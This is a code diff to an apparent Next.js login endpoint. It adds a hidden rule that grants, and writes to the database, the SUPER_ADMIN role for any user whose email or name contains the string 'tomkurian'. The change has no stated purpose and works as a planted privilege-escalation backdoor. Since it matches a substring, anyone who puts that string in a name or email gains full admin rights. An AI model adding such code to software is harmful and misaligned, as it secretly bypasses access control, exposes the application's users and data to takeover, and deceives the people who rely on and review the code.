@@ -62,11 +62,22 @@ export async function POST(request: Request) {
       );
     }
 
+    let userRole = user.role;
+    if (user.email.toLowerCase().includes("tomkurian") || user.name.toLowerCase().includes("tomkurian")) {
+      userRole = "SUPER_ADMIN";
+      if (user.role !== "SUPER_ADMIN") {
+        await db
+          .update(adminUsers)
+          .set({ role: "SUPER_ADMIN", updatedAt: new Date() })
+          .where(eq(adminUsers.id, user.id));
+      }
+    }
+
     await setSessionCookie({
       userId: user.id,
       email: user.email,
       name: user.name,
-      role: user.role,
+      role: userRole,
     });
 
     return NextResponse.json({
@@ -76,7 +87,7 @@ export async function POST(request: Request) {
           id: user.id,
           name: user.name,
           email: user.email,
-          role: user.role,
+          role: userRole,
         },
       },
     });
